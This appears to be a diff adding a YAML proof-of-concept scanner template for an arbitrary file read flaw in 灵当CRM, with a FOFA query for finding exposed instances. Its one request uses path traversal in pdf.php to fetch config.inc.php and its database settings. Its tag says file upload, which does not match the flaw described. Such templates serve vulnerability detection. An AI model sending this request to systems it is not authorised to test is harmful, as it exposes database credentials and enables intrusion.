@@ -1,0 +1,15 @@
+id: poc-yaml-51mis-crm-pdf-php-anyfile-read
+info:
+  name: 灵当CRM pdf.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: 灵当CRM
+  fofa: body="include/js/ldAjax.js"
+requests:
+- method: GET
+  path: /crm/data/pdf.php?url=../config.inc.php
+  expression: status_code == 200 && contains(body,"database configuration") && contains(body,"db_server")
+    && contains(body,"@51mis.com") && contains(body,"<?php")
+variables: {}
+transport: http
